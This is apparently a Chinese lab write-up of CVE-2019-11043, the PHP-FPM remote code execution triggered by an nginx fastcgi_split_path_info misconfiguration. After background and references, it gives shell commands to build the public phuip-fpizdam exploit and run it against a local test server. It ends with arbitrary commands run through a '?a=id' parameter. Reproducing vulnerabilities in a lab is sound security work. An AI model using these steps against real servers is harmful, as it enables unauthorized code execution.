# CVE-2019-11043

**利用条件：**nginx配置了fastcgi_split_path_info

**受影响系统：**PHP 5.6-7.x，Nginx>=0.7.31

在长亭科技举办的 Real World CTF 中，国外安全研究员 Andrew Danau 在解决一道 CTF 题目时发现，向目标服务器 URL 发送 %0a 符号时，服务返回异常，疑似存在漏洞。

在使用一些有错误的Nginx配置的情况下，通过恶意构造的数据包，即可让PHP-FPM执行任意代码。

参考链接：

- https://bugs.php.net/bug.php?id=78599
- https://lab.wallarm.com/php-remote-code-execution-0-day-discovered-in-real-world-ctf-exercise/
- https://github.com/neex/phuip-fpizdam

```shell
git clone https://github.com/neex/phuip-fpizdam.git
cd phuip-fpizdam
go get -v && go build
```

在当前文件下运行：

```shell
go run . "http://127.0.0.1:8080/index.php"
```

![image-20211122230315686](https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211122230315686.png)

访问链接`http://192.168.47.128:8080/?a=id`


![image-20211122230236364](https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211122230236364.png)

> 注意，因为php-fpm会启动多个子进程，在访问`/index.php?a=id`时需要多访问几次，以访问到被污染的进程。